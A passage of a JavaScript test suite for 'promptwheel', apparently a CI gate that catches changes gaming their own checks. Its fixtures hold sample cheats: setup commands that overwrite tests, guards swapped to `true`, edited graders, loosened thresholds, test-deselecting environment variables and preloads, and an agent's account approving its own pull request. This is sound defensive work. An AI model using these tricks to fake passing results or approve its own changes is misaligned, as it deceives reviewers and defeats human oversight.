  assert.equal(r.rep.metrics.find((x) => x.name === 'asserts').status, 'improved');
  rmSync(d, { recursive: true, force: true });
});
test('gamingThreshold: one made more lenient in the change it judges is held at the value before; a lenient one already in force applies', () => {
  const DONE = { name: 'done', cmd: 'grep -rho DONE . --include=*.js 2>/dev/null | wc -l', extract: 'number', direction: 'up', guard: true };
  const mk = (before, after) => {
    const d = bareRepo();
    cfgFile(d, { gamingThreshold: before, metrics: [DONE] });
    writeFileSync(join(d, 'src.js'), '// start\n'); writeFileSync(join(d, 'x.test.js'), '// tests\n'); commitAll(d, 'base');
    cfgFile(d, { gamingThreshold: after, metrics: [DONE] });
    writeFileSync(join(d, 'src.js'), '// DONE\n'); writeFileSync(join(d, 'x.test.js'), '// DONE\n');   // half the gain from source, half from a test file
    commitAll(d, 'head');
    const r = lastChange(d); rmSync(d, { recursive: true, force: true }); return r;
  };
  const lowered = mk(0.6, 0.1);
  assert.equal(lowered.code, 2, lowered.out);
  assert.match(lowered.rep.metrics[0].gamingReason, /threshold 60%/);
  assert.equal(mk(0.1, 0.1).code, 0, 'a threshold that was already 0.1 before the change applies');
  assert.equal(mk(0.1, 0.6).code, 2, 'a stricter one applies at once');
});
test('setup: a setup added in the change that rewrites the test is judged under the setup before it', () => {
  const RIG = 'echo "// rigged" > app.test.js';
  // a regression hidden: the source breaks, and the new setup overwrites the honest test in every checkout
  let d = srcRepo(GOOD_SRC, { metrics: [TESTS_PASS] });
  cfgFile(d, { setup: RIG, metrics: [TESTS_PASS] });
  writeFileSync(join(d, 'src.js'), BAD_SRC); commitAll(d, 'break the source, rig the setup');
  let r = lastChange(d);
  assert.equal(r.code, 2, r.out);
  assert.ok(r.rep.gate.weakened.some((w) => w.name === 'tests_pass' && w.change === 'measurement-edited' && w.status === 'regressed'), JSON.stringify(r.rep.gate));
  assert.equal(r.rep.gate.changed, true, 'setup is part of the gate fingerprint');
  assert.equal(conformsToContract(r.rep).ok, true, conformsToContract(r.rep).errors.join('; '));
  assert.match(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']).out, /GATE WEAKENED, how the guard "tests_pass" is measured/);
  const a = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--allow', 'the build moved']);
  assert.equal(a.code, 0, a.out); assert.ok(reportOf(a.out).allowed.cleared.includes('gate'));
  rmSync(d, { recursive: true, force: true });
  // a red suite painted green: nothing but the setup changed
  d = srcRepo(BAD_SRC, { metrics: [TESTS_PASS] });
  cfgFile(d, { setup: RIG, metrics: [TESTS_PASS] }); commitAll(d, 'rig the setup');
  r = lastChange(d);
  assert.equal(r.code, 2, r.out);
  assert.ok(r.rep.gate.weakened.some((w) => w.name === 'tests_pass' && w.change === 'measurement-edited' && w.status === 'failed'), JSON.stringify(r.rep.gate));
  rmSync(d, { recursive: true, force: true });
  // a win the setup carries: it copies a file only the head has over the test, so the base reads red and the head green
  d = srcRepo(BAD_SRC, { metrics: [TESTS_PASS] });
  cfgFile(d, { setup: 'test -f tools/rig.js && cp tools/rig.js app.test.js || true', metrics: [TESTS_PASS] });
  mkdirSync(join(d, 'tools')); writeFileSync(join(d, 'tools', 'rig.js'), '// rigged\n'); commitAll(d, 'a "fix"');
  r = lastChange(d);
  assert.equal(r.code, 2, r.out);
  const m = r.rep.metrics.find((x) => x.name === 'tests_pass');
  assert.equal(m.status, 'improved'); assert.equal(m.gamed, true, 'the source-only re-run uses the setup from before the change');
  rmSync(d, { recursive: true, force: true });
});
test('setup: a setup, env or linkDirs change with honest tests reads as a gate change only', () => {
  for (const edit of [{ setup: 'echo built > build.log' }, { env: { CI: '1' } }, { linkNodeModules: undefined, linkDirs: ['vendor'] }]) {
    const d = srcRepo(BAD_SRC, { metrics: [TESTS_PASS] });
    cfgFile(d, { ...edit, metrics: [TESTS_PASS] }); commitAll(d, 'change how the gate measures');
    let r = lastChange(d);
    assert.equal(r.code, 3, `${JSON.stringify(edit)}: a red suite stays red, so it is inconclusive as before: ${r.out}`);
    assert.equal(r.rep.gate.changed, true, JSON.stringify(edit)); assert.equal(r.rep.gate.weakened, undefined, JSON.stringify(r.rep.gate));
    writeFileSync(join(d, 'src.js'), GOOD_SRC); commitAll(d, 'fix the bug');
    assert.equal(lastChange(d).code, 0);
    rmSync(d, { recursive: true, force: true });
  }
  const d = srcRepo(BAD_SRC, { metrics: [TESTS_PASS] });             // the setup changes in the same change as a real fix
  cfgFile(d, { setup: 'echo built > build.log', metrics: [TESTS_PASS] });
  writeFileSync(join(d, 'src.js'), GOOD_SRC); commitAll(d, 'fix the bug, add a build step');
  const r = lastChange(d);
  assert.equal(r.code, 0, r.out);
  assert.equal(r.rep.gate.changed, true); assert.equal(r.rep.gate.weakened, undefined, JSON.stringify(r.rep.gate));
  assert.match(r.rep.metrics[0].gamingReason, /the source earned it/);
  rmSync(d, { recursive: true, force: true });
});

test('setup: the one `init` writes into a first config is not held against it; a setup fix that turns a red guard green on a committed config needs --allow', () => {
  const buildGated = (d) => {                                        // a suite that passes only after `npm run build`
    writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'b', scripts: { build: 'node build.js', test: 'node app.test.js' } }));
    writeFileSync(join(d, 'build.js'), "require('fs').writeFileSync('built.js', 'module.exports = 5;\\n');\n");
    writeFileSync(join(d, 'app.test.js'), "require('assert').strictEqual(require('./built.js'), 5);\n");
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\nbuilt.js\n');
  };
  let d = bareRepo(); buildGated(d); commitAll(d, 'base');           // zero-config: no setup, so the suite cannot pass
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  assert.equal(JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).setup, 'npm run build --if-present');
  commitAll(d, 'init');
  let r = lastChange(d);
  assert.equal(r.code, 0, r.out); assert.equal(r.rep.gate.weakened, undefined, JSON.stringify(r.rep.gate));
  rmSync(d, { recursive: true, force: true });
  const NPM_TEST = { ...TESTS_PASS, cmd: 'npm test --silent' };
  d = bareRepo(); buildGated(d); cfgFile(d, { metrics: [NPM_TEST] }); commitAll(d, 'base');   // a committed config with no setup: red
  cfgFile(d, { setup: 'npm run build', metrics: [NPM_TEST] }); commitAll(d, 'add the build step');
  r = lastChange(d);
  assert.equal(r.code, 2, r.out);                                    // the gate cannot tell a build from a rewrite of the test: a person says which
  assert.ok(r.rep.gate.weakened.some((w) => w.name === 'tests_pass' && w.change === 'measurement-edited' && w.status === 'failed'), JSON.stringify(r.rep.gate));
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--allow', 'the tests need the build']).code, 0);
  writeFileSync(join(d, 'note.txt'), 'x\n'); commitAll(d, 'the next change');
  assert.equal(lastChange(d).code, 0, 'and it applies from the next change on');
  rmSync(d, { recursive: true, force: true });
});
test('setup: a base config that extends a file outside the repository is not compared on setup, env or linkDirs (no false gate change)', () => {
  const root = mkdtempSync(join(tmpdir(), 'pw-outside-'));
  writeFileSync(join(root, 'shared.json'), JSON.stringify({ env: { SHARED: '1' }, setup: 'echo shared > shared.log' }));
  const d = join(root, 'repo'); mkdirSync(d);
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), 'shared.log\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ extends: '../shared.json', linkNodeModules: false, metrics: [TESTS_PASS] }));
  writeFileSync(join(d, 'src.js'), GOOD_SRC); writeFileSync(join(d, 'app.test.js'), HONEST_TEST); commitAll(d, 'base');
  writeFileSync(join(d, 'note.txt'), 'x\n'); commitAll(d, 'an honest change');
  const r = lastChange(d);
  assert.equal(r.code, 0, r.out);
  assert.equal(r.rep.gate.changed, undefined, 'the inherited setup and env are the same at both refs');
  assert.equal(r.rep.gate.weakened, undefined, JSON.stringify(r.rep.gate));
  rmSync(root, { recursive: true, force: true });
});

test('supply-chain: the dependency-update reason names pins_changed, so a version bump passes and a bump that also adds an install script does not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-bump-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const pkg = { name: 'demo', scripts: { test: 'node -e 0' }, dependencies: { 'left-pad': '^1' } };
  const lock = (v) => ({ lockfileVersion: 3, packages: { '': { name: 'demo' }, 'node_modules/left-pad': { version: v, resolved: `https://registry.npmjs.org/left-pad/-/left-pad-${v}.tgz`, integrity: `sha512-${v}` } } });
  const write = (p, v) => { writeFileSync(join(d, 'package.json'), JSON.stringify(p, null, 2) + '\n'); writeFileSync(join(d, 'package-lock.json'), JSON.stringify(lock(v), null, 2) + '\n'); };
  write(pkg, '1.3.0'); commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'the contract');
  const REASON = 'pins_changed: dependabot update, reviewed in this PR';   // the line in packs/supply-chain/README.md
  assert.ok(readFileSync(join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'README.md'), 'utf8').includes(`'${REASON}'`), 'the README still gives this reason');
  const run = (...extra) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...extra]); return { code: r.code, rep: reportOf(r.out) }; };
  // a plain version bump moves the fingerprint and nothing else
  write(pkg, '1.3.1'); commitAll(d, 'bump left-pad');
  let r = run();
  assert.equal(r.code, 1); assert.deepEqual(r.rep.allowable, ['pins_changed'], 'a version bump is one thing');
  r = run('--allow', REASON);
  assert.equal(r.code, 0, JSON.stringify(r.rep.allowed)); assert.deepEqual(r.rep.allowed.cleared, ['pins_changed']);
  // the same bump with an install script riding along: the reason covers the bump only
  write({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'node setup.js' } }, '1.3.2'); commitAll(d, 'bump left-pad again');
  r = run('--allow', REASON);
  assert.equal(r.code, 1, 'the install script is not waved through'); assert.deepEqual(r.rep.allowed.cleared, ['pins_changed']);
  assert.equal(r.rep.metrics.find((m) => m.name === 'lifecycle_scripts').ok, false);
  assert.ok(r.rep.allowable.includes('lifecycle_scripts'));
  rmSync(d, { recursive: true, force: true });
});

test('supply-chain: a person can accept a hooks change with --allow; a trailer cannot, and a workflow stays frozen either way', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-hooks-'));
  execFileSync('git', ['init', '-q'], { cwd: d });
  execFileSync('git', ['config', 'user.email', 't@t'], { cwd: d }); execFileSync('git', ['config', 'user.name', 't'], { cwd: d });
  mkdirSync(join(d, 'src')); writeFileSync(join(d, 'src/a.js'), 'export const a = 1;\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x' }));
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
  commitAll(d, 'contract');
  mkdirSync(join(d, '.claude')); writeFileSync(join(d, '.claude/settings.json'), '{"hooks":{}}\n');
  commitAll(d, 'share the hooks\n\nPromptwheel-Allow: an agent approving itself');
  let r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 1, 'a trailer does not clear it');
  assert.ok(JSON.parse(r.out.slice(r.out.indexOf('{'))).mandates.some((m) => m.name === 'hooks-frozen'));
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'the team shares the hooks']);
  assert.equal(r.code, 0, r.out);
  assert.ok(JSON.parse(r.out).allowed.cleared.includes('mandate:hooks-frozen'));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/x.yml'), 'on: push\n');
  commitAll(d, 'add a workflow');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'please']);
  assert.equal(r.code, 1, 'a workflow change is not cleared by --allow');
  rmSync(d, { recursive: true, force: true });
});

// two cheats in one change: the guard is swapped or renamed AND the test is edited, so the old guard "passes" too
const TPG = { name: 'tests_pass', cmd: 'node app.test.js', extract: 'exit', direction: 'pass', guard: true };
const SRC_BAD = 'module.exports = { add: (a, b) => a - b };\n', SRC_GOOD = 'module.exports = { add: (a, b) => a + b };\n';
const T_HONEST = "require('assert').strictEqual(require('./src').add(2, 3), 5);\n", T_RIGGED = "require('assert').strictEqual(require('./src').add(2, 3), -1);\n";
function comboRepo(config) {
  const d = mkdtempSync(join(tmpdir(), 'pw-combo-'));
  for (const x of [['init', '-q'], ['config', 'user.email', 't@t'], ['config', 'user.name', 't']]) execFileSync('git', x, { cwd: d });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, ...config }));
  writeFileSync(join(d, 'src.js'), SRC_BAD); writeFileSync(join(d, 'app.test.js'), T_HONEST); commitAll(d, 'base (red)');
  return d;
}
const verdictOf = (d) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']); return { code: r.code, rep: reportOf(r.out) }; };
test('gate integrity: a guard swapped to `true` in the change that also edits the test green reads GAMED; swapped alongside a real fix it passes', () => {
  let d = comboRepo({ metrics: [TPG] });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TPG, cmd: 'true' }] })); writeFileSync(join(d, 'app.test.js'), T_RIGGED); commitAll(d, 'cheat');
  let v = verdictOf(d); assert.equal(v.code, 2, JSON.stringify(v.rep.gate)); assert.equal(v.rep.verdict, 'gamed');
  rmSync(d, { recursive: true, force: true });
  d = comboRepo({ metrics: [TPG] });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TPG, cmd: 'node ./app.test.js' }] })); writeFileSync(join(d, 'src.js'), SRC_GOOD); commitAll(d, 'real fix, new command');
  v = verdictOf(d); assert.equal(v.code, 0, JSON.stringify(v.rep.gate)); assert.equal(v.rep.gate.weakened, undefined);
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: a guard renamed with its re-run switched off, in the change that edits the test green, reads GAMED; renamed alongside a real fix it passes', () => {
  let d = comboRepo({ metrics: [TPG] });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TPG, name: 'suite', gamingCheck: false }] })); writeFileSync(join(d, 'app.test.js'), T_RIGGED); commitAll(d, 'cheat');
  let v = verdictOf(d); assert.equal(v.code, 2, JSON.stringify(v.rep.gate)); assert.equal(v.rep.verdict, 'gamed');
  rmSync(d, { recursive: true, force: true });
  d = comboRepo({ metrics: [TPG] });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TPG, name: 'suite' }] })); writeFileSync(join(d, 'src.js'), SRC_GOOD); commitAll(d, 'real fix, renamed guard');
  v = verdictOf(d); assert.equal(v.code, 0, JSON.stringify(v.rep.gate)); assert.equal(v.rep.gate.weakened, undefined);
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: an evaluatorPath dropped in the change that edits that file to win still counts; dropped with the file untouched it is only a gate change', () => {
  const GATE = { name: 'gate', cmd: 'node check.js', extract: 'exit', direction: 'pass', guard: true };
  const mk = () => { const d = mkdtempSync(join(tmpdir(), 'pw-combo-')); for (const x of [['init', '-q'], ['config', 'user.email', 't@t'], ['config', 'user.name', 't']]) execFileSync('git', x, { cwd: d });
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, evaluatorPaths: ['limits.json'], metrics: [GATE] }));
    writeFileSync(join(d, 'limits.json'), '{"max":1}\n'); writeFileSync(join(d, 'check.js'), "process.exit(require('./limits.json').max >= 5 ? 0 : 1);\n"); commitAll(d, 'base (red)'); return d; };
  let d = mk();
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [GATE] })); writeFileSync(join(d, 'limits.json'), '{"max":9}\n'); commitAll(d, 'cheat');
  let v = verdictOf(d); assert.equal(v.code, 2, JSON.stringify(v.rep)); assert.equal(v.rep.verdict, 'gamed');
  rmSync(d, { recursive: true, force: true });
  d = mk();
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [GATE] })); commitAll(d, 'drop the declaration only');
  v = verdictOf(d); assert.notEqual(v.rep.verdict, 'gamed', JSON.stringify(v.rep));
  rmSync(d, { recursive: true, force: true });
});

test('limit: a build script that the unchanged setup runs is source, so a change that makes it rewrite a test is not seen', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-combo-'));
  for (const x of [['init', '-q'], ['config', 'user.email', 't@t'], ['config', 'user.name', 't']]) execFileSync('git', x, { cwd: d });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, setup: 'npm run build --silent', metrics: [TPG] }));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'true' } }));
  writeFileSync(join(d, 'src.js'), SRC_GOOD); writeFileSync(join(d, 'app.test.js'), T_HONEST); commitAll(d, 'base (green)');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'echo > app.test.js' } })); writeFileSync(join(d, 'src.js'), SRC_BAD); commitAll(d, 'break the source, rig the build');
  // stated in the README: a cheat that lives in the source or the build is outside what a source-only re-run can see
  assert.equal(verdictOf(d).code, 0);
  rmSync(d, { recursive: true, force: true });
});

const GRADER_PATHS = ['grader.py', 'eval.py', 'grader.sh', 'eval.sh', 'score.py', 'evals/check.py', 'graders/check.sh', 'scripts/grade.sh', 'grade.js', 'evals/run.js'];
test('isNonSource: a grader, eval or score script in any scripting language, and anything under evals/ or graders/, is non-source', () => {
  for (const p of [...GRADER_PATHS, 'tools/eval_model.py', 'grader/rubric.rb', 'evals/fixtures.json', 'packages/x/evals/judge.ts', 'scoring.R'])
    assert.equal(isNonSource(p), true, p);
});
test('isNonSource: ordinary source near those words stays source', () => {
  // a word that only starts with the token, a score/scoring module directory, compiled interpreters named eval,
  // and PascalCase domain types are production code; a fix in any of them must never read GAMED.
  for (const p of ['src/scoreboard.js', 'src/evaluate-order.js', 'evaluate.py', 'src/evaluation.py', 'src/scores.ts', 'src/grades.py',
    'src/lib/analysis/scoring/index.ts', 'src/lib/calculations/scores/altman.ts', 'app/api/score/route.ts', 'src/components/Score.tsx',
    'src/eval.c', 'interp/eval.go', 'src/eval.rs', 'pkg/eval/parse.go', 'src/main/java/Grade.java'])
    assert.equal(isNonSource(p), false, p);
});
test('run: a commit that edits only the grader reads GAMED in any language', () => {
  for (const f of GRADER_PATHS) {
    const d = tmpRepo([{ name: 'tests_pass', cmd: `sh ${f}`, extract: 'exit', direction: 'pass', guard: true }]);
    mkdirSync(join(d, dirname(f)), { recursive: true });
    writeFileSync(join(d, f), 'exit 1\n'); commitAll(d, 'base');
    writeFileSync(join(d, f), 'exit 0\n'); commitAll(d, 'mock the grader');
    const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']);
    assert.equal(r.code, 2, `${f}: ${r.out}`);
    rmSync(d, { recursive: true, force: true });
  }
});

test('cli: lock outside a git repository prints one line and exits 64', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lock-norepo-'));
  const r = pw(d, ['lock']);
  assert.equal(r.code, 64, r.out);
  assert.match(r.out, /not inside a git repository/);
  assert.doesNotMatch(r.out, /\n\s+at |ConfigError/, 'no stack trace');
  rmSync(d, { recursive: true, force: true });
});
test('cli: --help lists every command, pr-allow included, and names no MCP surface', () => {
  const r = pw(tmpdir(), ['--help']);
  for (const c of ['run', 'init', 'lock', 'pr-allow']) assert.match(r.out, new RegExp(`promptwheel ${c}\\b`), c);
  assert.doesNotMatch(r.out, /MCP/);
});

test('pr-allow: reads every page gh prints (one comment per line), so the newest approval on a long PR wins', () => {
  const c = (body, assoc = 'OWNER') => JSON.stringify({ body, author_association: assoc, user: { type: 'User', login: 'pat' } });
  const lines = Array.from({ length: 150 }, (_, i) => c(i === 3 ? 'sawbuck-allow: the old reason' : i === 140 ? 'sawbuck-allow: the new reason' : 'chatter'));
  const prAllow = (input) => execFileSync('node', [ENGINE, 'pr-allow'], { input, encoding: 'utf8' });
  assert.equal(prAllow(lines.join('\n') + '\n'), 'the new reason (approved by pat)');
  assert.equal(prAllow(`[${lines.join(',')}]`), 'the new reason (approved by pat)', 'a single JSON array still works');
  assert.equal(prAllow(''), '');
  const action = readFileSync(join(dirname(ENGINE), '..', 'action.yml'), 'utf8');
  assert.match(action, /gh api --paginate "repos\/\$REPO\/issues\/\$PR\/comments\?per_page=100" --jq '\.\[\]'/, 'the Action reads every page, not the oldest 100');
});

// 0.8.10: who may let a pull request through. Until now the newest `sawbuck-allow:` comment from any account of type
// User with write access counted, the account that opened the pull request included. A coding agent run from a
// service account (a GitHub machine user: a User, with a token that writes pull requests) opens its pull requests
// from that account, and the check's own comment spells out the words to post. Run with the Action's own steps
// (proof-bench/pr-shapes, 2026-11-14): the opener's comment let a gamed green through, and let a pull request that
// rewrote its own contract through. The opener's own comment no longer counts, unless the contract on the BASE
// branch says a repo with one person in it wants that.
test('approval on a PR: the account that opened it does not count, in any letter case; another person does', () => {
  const c = (body, login, assoc = 'COLLABORATOR', type = 'User') => ({ body, author_association: assoc, user: { type, login } });
  const opener = { author: 'acme-agent-svc' };
  assert.equal(allowFromComments([c('sawbuck-allow: it is fine', 'acme-agent-svc')], opener), '', 'the opener');
  assert.equal(allowFromComments([c('sawbuck-allow: it is fine', 'Acme-Agent-SVC')], opener), '', 'the opener, in another letter case');
  assert.equal(allowFromComments([c('sawbuck-allow: I looked', 'pat', 'MEMBER')], opener), 'I looked (approved by pat)', 'another person');
  assert.equal(allowFromComments([c('sawbuck-allow: I looked', 'pat', 'MEMBER'), c('sawbuck-allow: it is fine', 'acme-agent-svc')], opener), 'I looked (approved by pat)', 'a newer comment from the opener does not hide a person\'s');
  assert.equal(allowFromComments([c('sawbuck-allow: it is fine', 'acme-agent-svc'), c('sawbuck-allow: I looked', 'pat', 'MEMBER')], opener), 'I looked (approved by pat)');
  assert.equal(allowFromComments([c('sawbuck-allow: it is fine', 'acme-agent-svc')], { ...opener, allowFromAuthor: true }), 'it is fine (approved by acme-agent-svc)', 'where the base contract says the opener may');
  assert.equal(allowFromComments([c('sawbuck-allow: it is fine', 'acme-agent-svc')]), 'it is fine (approved by acme-agent-svc)', 'with no opener named, as before (a caller that does not know who opened it)');
  assert.equal(allowFromComments([c('sawbuck-allow: x', 'some-app[bot]', 'NONE', 'Bot')], opener), '', 'a bot still never counts');
});
test('pr-allow --author: the contract on the base branch decides whether the opener counts; the branch cannot say so for itself', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }]); commitAll(d, 'base');
  const base = rev(d);
  const mine = JSON.stringify({ body: 'sawbuck-allow: it is fine', author_association: 'COLLABORATOR', user: { type: 'User', login: 'acme-agent-svc' } });
  const theirs = JSON.stringify({ body: 'sawbuck-allow: I looked', author_association: 'MEMBER', user: { type: 'User', login: 'pat' } });
  const note = join(d, '..', `note-${Date.now()}.md`);
  const prAllow = (input, ...a) => { try { return execFileSync('node', [ENGINE, 'pr-allow', ...a], { cwd: d, input, encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] }); } catch (e) { return `EXIT ${e.status}`; } };
  assert.equal(prAllow(mine + '\n', '--author', 'acme-agent-svc', '--base', base, '--note', note), '', 'the opener, and the base contract is silent');
  const said = readFileSync(note, 'utf8'); assert.match(said, /acme-agent-svc/); assert.match(said, /opened/); assert.match(said, /allowFromAuthor/, 'the note says what was not counted, why, and the setting for a repo with one person in it');
  assert.equal(prAllow(theirs + '\n' + mine + '\n', '--author', 'acme-agent-svc', '--base', base, '--note', note), 'I looked (approved by pat)');
  assert.equal(readFileSync(note, 'utf8'), '', 'nothing to explain when a person let it through');
  // the branch adds the setting: the base still decides
  const cfgPath = join(d, 'promptwheel.config.json'); const cfg = JSON.parse(readFileSync(cfgPath, 'utf8'));
  writeFileSync(cfgPath, JSON.stringify({ ...cfg, allowFromAuthor: true })); commitAll(d, 'let the opener approve');
  assert.equal(prAllow(mine + '\n', '--author', 'acme-agent-svc', '--base', base), '', 'added in the same change, it does not count for that change');
  // once it is on the base, it counts
  assert.equal(prAllow(mine + '\n', '--author', 'acme-agent-svc', '--base', rev(d)), 'it is fine (approved by acme-agent-svc)');
  // and the change that adds it shows as a change to the gate
  const r = pw(d, ['run', '--base', base, '--head', 'HEAD', '--no-record', '--no-auto', '--json']); assert.equal(JSON.parse(r.out).gate.changed, true, 'adding the setting is a change to the gate, and the report says so');
  // no --author: as before
  assert.equal(prAllow(mine + '\n'), 'it is fine (approved by acme-agent-svc)');
});
test('the Action hands pr-allow the account that opened the pull request and the base commit, and posts its note', () => {
  const action = readFileSync(join(dirname(ENGINE), '..', 'action.yml'), 'utf8');
  assert.match(action, /OPENER: \$\{\{ github\.event\.pull_request\.user\.login \}\}/, 'the opener comes from GitHub, in the environment, not typed into the script');
  assert.match(action, /pr-allow --author "\$OPENER" --base "\$BASE" --note "\$RUNNER_TEMP\/promptwheel-allow-note\.md"/);
  assert.match(action, /pr-comment [\s\S]*--note "\$RUNNER_TEMP\/promptwheel-allow-note\.md"/, 'what was not counted is in the comment the check posts');
});
test('the report tells a reader who may accept it: someone with write access who did not open the pull request', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', scripts: { postinstall: 'x' } })); commitAll(d, 'script');
  const md = (extra = []) => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--markdown', ...extra]).out;
  assert.match(md(), /To accept this, someone with write access who did not open this PR comments `sawbuck-allow: [^`]*<their reason>` on it, and the check is run again\./);
  // a reason that names one of two things: the line about what was not let through says the same about who
  assert.match(md(['--allow', 'lifecycle_scripts: we need it']), /To accept them all, someone with write access who did not open this PR comments `sawbuck-allow: [^`]*<their reason>`\./);
  assert.doesNotMatch(md(), /<your reason>/, 'the reader of the comment may be the one who opened it');
});

// What the check borrows from the machine it runs on and no diff shows. Measured 2026-11-11 (proof-bench/outside-git): a
// `PYTEST_ADDOPTS` that deselects the red test, and a preload in `NODE_OPTIONS` that forces a pass, each read pass while
// a fresh install was red. Removing them could break a setup that needs them, so the check runs as it is told and says
// so: a note, never a verdict. A variable the contract's own `env` sets is declared, and is not noted.
test('a variable in the environment that can change which tests run is said, as a note and never a verdict', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'preload.js'), ''); commitAll(d, 'base'); writeFileSync(join(d, 'x.txt'), '1'); commitAll(d, 'a change');
  const clean = { ...process.env }; for (const k of ['PYTEST_ADDOPTS', 'PYTEST_PLUGINS', 'NODE_OPTIONS']) delete clean[k];
  const run = (env, ...extra) => execFileSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', ...extra], { cwd: d, encoding: 'utf8', env: { ...clean, ...env } });
  const rep = (env) => JSON.parse(run(env, '--json'));
  const note = (r) => (r.explained || []).find((x) => x.metric === 'environment');
  assert.equal(note(rep({})), undefined, 'nothing set, nothing said');
  let r = rep({ PYTEST_ADDOPTS: '--deselect tests/test_a.py::test_red' });
  assert.equal(r.verdict, 'pass', 'a note, never a verdict'); assert.equal(note(r).noted, true); assert.deepEqual(note(r).items, ['PYTEST_ADDOPTS']);
  assert.deepEqual(note(rep({ PYTEST_PLUGINS: 'always_green' })).items, ['PYTEST_PLUGINS']);
  assert.equal(note(rep({ NODE_OPTIONS: '--max-old-space-size=4096' })), undefined, 'a NODE_OPTIONS that loads nothing is not one');
  assert.deepEqual(note(rep({ NODE_OPTIONS: '--require ./preload.js' })).items, ['NODE_OPTIONS'], 'a preload is');
  assert.deepEqual(note(rep({ NODE_OPTIONS: '--max-old-space-size=4096 --import=./preload.js', PYTEST_ADDOPTS: '-k fast' })).items, ['PYTEST_ADDOPTS', 'NODE_OPTIONS']);
  assert.match(run({ PYTEST_ADDOPTS: '-k fast' }, '--markdown'), /ℹ️ \*\*Note:\*\* the environment this ran in can change which tests run, or load code into them: `PYTEST_ADDOPTS`/);
  assert.match(run({ PYTEST_ADDOPTS: '-k fast' }), /note: the environment this ran in can change which tests run, or load code into them: PYTEST_ADDOPTS/, 'and in the plain report');
  // declared in the contract's own env: part of the gate, on the record, not a surprise
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, env: { PYTEST_ADDOPTS: '-q' }, metrics: [{ name: 'tests_pass', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }] })); commitAll(d, 'the contract sets it'); writeFileSync(join(d, 'x.txt'), '2'); commitAll(d, 'another change');
  assert.equal(note(rep({ PYTEST_ADDOPTS: '-k fast' })), undefined, 'a variable the contract itself sets is not noted');
});

test('--allow on a gamed commit: the JSON and the PR comment both carry the reason and what it cleared', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'sh test/a.sh', extract: 'exit', direction: 'pass', guard: true }]);
  mkdirSync(join(d, 'test'));
  writeFileSync(join(d, 'test/a.sh'), 'exit 1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'test/a.sh'), 'exit 0\n'); commitAll(d, 'edit the test');
  const args = ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--allow', 'the spec changed'];
  let r = pw(d, [...args, '--json']);
  assert.equal(r.code, 0, r.out);
  const rep = reportOf(r.out);
